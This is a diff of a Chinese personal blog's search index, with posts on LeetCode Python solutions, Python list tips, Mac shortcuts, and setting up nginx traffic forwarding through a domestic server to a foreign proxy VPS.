+<h5 id="解法2：不利用字符串"><a href="#解法2：不利用字符串" class="headerlink" title="解法2：不利用字符串"></a>解法2：不利用字符串</h5><p>翻转整个数值，官方题解有说反转一半，以防溢出，但是溢出不就不是回文数了，因此我觉得不需要考虑溢出。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">        ans = <span class="hljs-number">0</span></span><br><span class="line">        pri = x</span><br><span class="line">        <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>:</span><br><span class="line">            ans = x%<span class="hljs-number">10</span> + ans*<span class="hljs-number">10</span></span><br><span class="line">            x //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">if</span> ans == pri:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="10-正则表达式匹配（困难）"><a href="#10-正则表达式匹配（困难）" class="headerlink" title="10. 正则表达式匹配（困难）"></a>10. 正则表达式匹配（困难）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个字符串<code>s</code>和一个字符规律<code>p</code>，请你来实现一个支持<code>&#39;.&#39;</code>和<code>&#39;*&#39;</code>的正则表达式匹配。<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">&apos;.&apos; 匹配任意单个字符</span><br><span class="line">&apos;*&apos; 匹配零个或多个前面的那一个元素</span><br></pre></td></tr></table></figure><br>所谓匹配，是要涵盖整个字符串<code>s</code>的，而不是部分字符串。</p>
 <ul>
-<li>一台国内服务器，如阿里云腾讯云等，我这里以阿里云为例，系统为Ubuntu 16.04。</li>
-<li>一台用于代理的服务器，我这里以Digitalocean为例，系统为Ubuntu 18.04.</li>
+<li><code>s</code>可能为空，且只包含从<code>a-z</code>的小写字母。</li>
+<li><code>p</code>可能为空，且只包含从<code>a-z</code>的小写字母，以及字符<code>.</code>和<code>*</code>。</li>
 </ul>
-<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>通过国内服务器转发流量看起来是多此一举，从“国内-&gt;境外VPS“变成了”国内-&gt;国内服务器-&gt;境外VPS“，但国内大厂的服务器出入境走的都是高级路线，国内服务器与我们的延迟大概在50ms以内，这样算起来延迟是降低了。<br><img src="/2020/02/04/network-jump/3.jpg" alt="左边为自己网络ping境外VPS和阿里云，右边为阿里云ping境外VPS"><br>从上图我们可以明显看到右边加上ping阿里云的延迟明显要比直接ping境外vps的延迟要小很多。<br>该方法属于<code>硬件加速</code>，代价是要多出额外的成本租一台国内服务器，优点是更稳定，可以有效防止境外IP或者端口被封。<br>而国内服务器在这里充当的作用就是流量转发。<br>该方法共分为三个步骤：</p>
+<h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure></p>
+<h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &apos;a&apos;。因此，字符串 &quot;aa&quot; 可被视为 &apos;a&apos; 重复了一次。</span><br></pre></td></tr></table></figure></p>
+<h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: &quot;.*&quot; 表示可匹配零个或多个（&apos;*&apos;）任意字符（&apos;.&apos;）。</span><br></pre></td></tr></table></figure></p>
+<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: 因为 &apos;*&apos; 表示零个或多个，这里 &apos;c&apos; 为 0 个, &apos;a&apos; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure></p>
+<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure></p>
+<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力递归"><a href="#解法1：暴力递归" class="headerlink" title="解法1：暴力递归"></a>解法1：暴力递归</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> s</span><br><span class="line">        <span class="hljs-comment"># 出现'.'的情况</span></span><br><span class="line">        first = bool(s) <span class="hljs-keyword">and</span> p[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> (s[<span class="hljs-number">0</span>], <span class="hljs-string">'.'</span>)</span><br><span class="line">        <span class="hljs-comment"># 出现'*'的情况</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(p)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==<span class="hljs-string">'*'</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> self.isMatch(s, p[<span class="hljs-number">2</span>:]) <span class="hljs-keyword">or</span> (first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p))</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> first <span class="hljs-keyword">and</span> self.isMatch(s[<span class="hljs-number">1</span>:], p[<span class="hljs-number">1</span>:])</span><br></pre></td></tr></table></figure></p>
 <ul>
-<li>国内服务器配置流量转发程序</li>
-<li>境外VPS配置代理程序</li>
-<li>自己的机器配置代理至国内服务器</li>
+<li>当出现<code>&#39;.&#39;</code>的时候，因为它匹配任意字符，因此只要额外判断<code>p[i]</code>是否等于<code>&#39;.&#39;</code>即可；</li>
+<li>对于出现<code>&#39;*&#39;</code>时，因为它匹配0个到任意个星号前面的字符，所以我们需要对它进行不同的处理，虽然他能匹配0～n个字符，但是对于递归而言，只有两种情况：0个和1个。</li>
 </ul>
-<p>还可以在境外的VPS上配置一些web页面，只对外开放80/443端口，其他端口对你的国内服务器的IP地址开放，这样当GFW扫描的时候也只是觉得这是一个网站而已。</p>
-<h3 id="二、国内服务器配置流量转发程序"><a href="#二、国内服务器配置流量转发程序" class="headerlink" title="二、国内服务器配置流量转发程序"></a>二、国内服务器配置流量转发程序</h3><p>这里用到nginx来配置流量转发</p>
-<h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></p>
-<h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><br>添加<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen Port; # 国内服务器的监听端口</span><br><span class="line">                proxy_pass 境外VPS的IP:Port;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>保存之后配置开机自启以及启动nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">systemctl <span class="hljs-built_in">enable</span> nginx &amp;&amp; systemctl start nginx</span><br></pre></td></tr></table></figure><br>如果你的服务器是阿里云或者腾讯云诸如此类，还需要配置安全组规则，开放TCP连接的listen中配置的端口。<br>如果你之前配置过了代理服务器，那现在将自己机器上的代理软件的IP地址和端口号改为国内这台服务器的地址和端口，应该就能实现科学上网了。<br>如果不行，请检查一下国内服务器有没有配置防火墙规则等。</p>
-<h3 id="三、配置境外VPS"><a href="#三、配置境外VPS" class="headerlink" title="三、配置境外VPS"></a>三、配置境外VPS</h3><p>如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：<a href="https://fansblog.club/2019/06/29/ipv6/" target="_blank" rel="noopener">Click Here</a><br>对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。<br><code>除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。</code></p>
-<h4 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h4><p>这里使用的是ubuntu的防火墙<code>ufw</code>。<br>ufw命令举例：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment"># 允许某个端口连接</span></span><br><span class="line">ufw allow port</span><br><span class="line"><span class="hljs-comment"># 允许此IP访问所有的本机端口</span></span><br><span class="line">ufw allow from IPv4</span><br><span class="line"><span class="hljs-comment"># 开启防火墙</span></span><br><span class="line">ufw <span class="hljs-built_in">enable</span></span><br></pre></td></tr></table></figure><br>经过上述配置后，GFW探测你的VPS，除了ssh和网站的常用端口外，ss/ssr的端口根本无法连接，IP地址的被墙的几率自然就降低了。</p>
-<h4 id="将境外VPS伪装的更像一个网站"><a href="#将境外VPS伪装的更像一个网站" class="headerlink" title="将境外VPS伪装的更像一个网站"></a>将境外VPS伪装的更像一个网站</h4><p>为了把境外VPS做的更像一个网站，因此我们在这台服务器上再放一些web页面。<br>同样的安装nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install nginx</span><br></pre></td></tr></table></figure><br>nginx安装完成的时候会自动启动，打开浏览器输入你服务器的IP地址，你会看到如下的界面。<br><img src="/2020/02/04/network-jump/4.jpg" alt="Welcome"><br>nginx的默认目录在<code>/var/www/html/</code><br>我们将静态页面放到这里面就可以了，一定要有个index.html哦。<br>因为我的博客repo在我的github上，因此我就直接git clone到上面这个目录下了。<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html/</span><br><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/aestheticisma.github.io</span><br><span class="line"><span class="hljs-comment"># 之后将aestheticisma.github.io里面的东西全部移动到/var/www/html/下</span></span><br><span class="line"><span class="hljs-built_in">cd</span> aestheticisma.github.io/</span><br><span class="line">cp -r ./* ..</span><br></pre></td></tr></table></figure><br>再次在浏览器输入服务器ip地址就会发现有东西显示了。<br>这样我们的境外VPS伪装完成了。</p>
-<h3 id="四、关于自己机器上的代理配置说明"><a href="#四、关于自己机器上的代理配置说明" class="headerlink" title="四、关于自己机器上的代理配置说明"></a>四、关于自己机器上的代理配置说明</h3><p>如果你之前用过shadowsocks诸如此类代理软件，就是相当于把ip地址和端口号换成了国内服务器的ip地址和在nginx中配置的监听端口号，其他的密码等都是和之前一样的，因为代理服务还是配置在境外VPS上的，国内的服务器只是起到了一个转发流量的作用。</p>
+<h5 id="解法2-递归优化"><a href="#解法2-递归优化" class="headerlink" title="解法2: 递归优化"></a>解法2: 递归优化</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(self, s, p)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type p: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: bool</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-comment"># 定义一个字典作为备忘录</span></span><br><span class="line">        memo = dict()</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dp</span><span class="hljs-params">(i, j)</span>:</span></span><br><span class="line">        	<span class="hljs-comment"># 避免重复计算</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (i,j) <span class="hljs-keyword">in</span> memo: <span class="hljs-keyword">return</span> memo[(i,j)] </span><br><span class="line">            <span class="hljs-keyword">if</span> j==len(p): <span class="hljs-keyword">return</span> i==len(s)</span><br><span class="line">            first = i&lt;len(s) <span class="hljs-keyword">and</span> p[j] <span class="hljs-keyword">in</span> (s[i], <span class="hljs-string">'.'</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> j&lt;len(p)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> p[j+<span class="hljs-number">1</span>] == <span class="hljs-string">'*'</span>:</span><br><span class="line">                ans = dp(i,j+<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                ans = first <span class="hljs-keyword">and</span> dp(i+<span class="hljs-number">1</span>,j+<span class="hljs-number">1</span>)</span><br><span class="line">            memo[(i,j)] = ans</span><br><span class="line">            <span class="hljs-keyword">return</span> ans</span><br><span class="line">        <span class="hljs-keyword">return</span> dp(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)</span><br></pre></td></tr></table></figure><br>使用两个变量<code>i</code>,<code>j</code>记录当前匹配到的位置，从而避免使用子字符串切片，并且将<code>i</code>,<code>j</code>存入备忘录，避免重复计算。</p>
 ]]></content>
       <categories>
-        <category>Daily Essays</category>
+        <category>LeetCode系列</category>
       </categories>
   </entry>
   <entry>
@@ -684,19 +640,6 @@
 ]]></content>
       <categories>
         <category>统计学习方法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Python中如何定义二维数组</title>
-    <url>/2019/11/17/py-cre-douarr/</url>
-    <content><![CDATA[<p>小知识点随手记录…<a id="more"></a></p>
-<h3 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h3><p>或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> numpy</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = numpy.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>],</span><br><span class="line">       [<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>]])</span><br></pre></td></tr></table></figure><br>但如果不用numpy呢？</p>
-<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>有人会说可以定义一个二维列表代替二维数组呗。</p>
-<h4 id="1-错误方式"><a href="#1-错误方式" class="headerlink" title="1. 错误方式"></a>1. 错误方式</h4><p>一开始一定会有人这样定义<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>特么的怎么连<code>a[1][0]</code>也跟着变成1了，因为上面的定义方式等价于：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list = [<span class="hljs-number">0</span>] * <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [temp_list, temp_list]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list</span><br><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？</p>
-<h4 id="2-正确方式"><a href="#2-正确方式" class="headerlink" title="2. 正确方式"></a>2. 正确方式</h4><p>我们可以用for来定义二维数组。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra = [ [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>可以看到这样做就没有上面的错误出现了。</p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
       </categories>
   </entry>
   <entry>
@@ -726,6 +669,23 @@
       </categories>
   </entry>
   <entry>
+    <title>Mac使用小技巧</title>
+    <url>/2020/03/12/mac-tips/</url>
+    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
+<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
+<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
+<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
+<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
+<li>浏览器新建标签页：<code>command + T</code></li>
+<li>快速调用emoji表情：<code>control + command + space</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Python实现字符串反转的几种方法</title>
     <url>/2019/11/15/py-str-reverse/</url>
     <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
@@ -737,6 +697,33 @@
 <h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line">	<span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
 <hr>
 <p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>通过国内服务器转发流量科学上网</title>
+    <url>/2020/02/04/network-jump/</url>
+    <content><![CDATA[<p>从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。<a id="more"></a><br>具体方法借鉴于该篇文章：<a href="https://www.hijk.pw/forward-traffic-via-internal-vps/" target="_blank" rel="noopener">Click Here</a><br>如果您不愿多点击一次链接，就请继续往下看，本文对于上述博文稍作整理。<br>完成此博文所介绍的方法的基本条件：</p>
+<ul>
+<li>一台国内服务器，如阿里云腾讯云等，我这里以阿里云为例，系统为Ubuntu 16.04。</li>
+<li>一台用于代理的服务器，我这里以Digitalocean为例，系统为Ubuntu 18.04.</li>
+</ul>
+<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>通过国内服务器转发流量看起来是多此一举，从“国内-&gt;境外VPS“变成了”国内-&gt;国内服务器-&gt;境外VPS“，但国内大厂的服务器出入境走的都是高级路线，国内服务器与我们的延迟大概在50ms以内，这样算起来延迟是降低了。<br><img src="/2020/02/04/network-jump/3.jpg" alt="左边为自己网络ping境外VPS和阿里云，右边为阿里云ping境外VPS"><br>从上图我们可以明显看到右边加上ping阿里云的延迟明显要比直接ping境外vps的延迟要小很多。<br>该方法属于<code>硬件加速</code>，代价是要多出额外的成本租一台国内服务器，优点是更稳定，可以有效防止境外IP或者端口被封。<br>而国内服务器在这里充当的作用就是流量转发。<br>该方法共分为三个步骤：</p>
+<ul>
+<li>国内服务器配置流量转发程序</li>
+<li>境外VPS配置代理程序</li>
+<li>自己的机器配置代理至国内服务器</li>
+</ul>
+<p>还可以在境外的VPS上配置一些web页面，只对外开放80/443端口，其他端口对你的国内服务器的IP地址开放，这样当GFW扫描的时候也只是觉得这是一个网站而已。</p>
+<h3 id="二、国内服务器配置流量转发程序"><a href="#二、国内服务器配置流量转发程序" class="headerlink" title="二、国内服务器配置流量转发程序"></a>二、国内服务器配置流量转发程序</h3><p>这里用到nginx来配置流量转发</p>
+<h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></p>
+<h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><br>添加<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen Port; # 国内服务器的监听端口</span><br><span class="line">                proxy_pass 境外VPS的IP:Port;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>保存之后配置开机自启以及启动nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">systemctl <span class="hljs-built_in">enable</span> nginx &amp;&amp; systemctl start nginx</span><br></pre></td></tr></table></figure><br>如果你的服务器是阿里云或者腾讯云诸如此类，还需要配置安全组规则，开放TCP连接的listen中配置的端口。<br>如果你之前配置过了代理服务器，那现在将自己机器上的代理软件的IP地址和端口号改为国内这台服务器的地址和端口，应该就能实现科学上网了。<br>如果不行，请检查一下国内服务器有没有配置防火墙规则等。</p>
+<h3 id="三、配置境外VPS"><a href="#三、配置境外VPS" class="headerlink" title="三、配置境外VPS"></a>三、配置境外VPS</h3><p>如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：<a href="https://fansblog.club/2019/06/29/ipv6/" target="_blank" rel="noopener">Click Here</a><br>对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。<br><code>除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。</code></p>
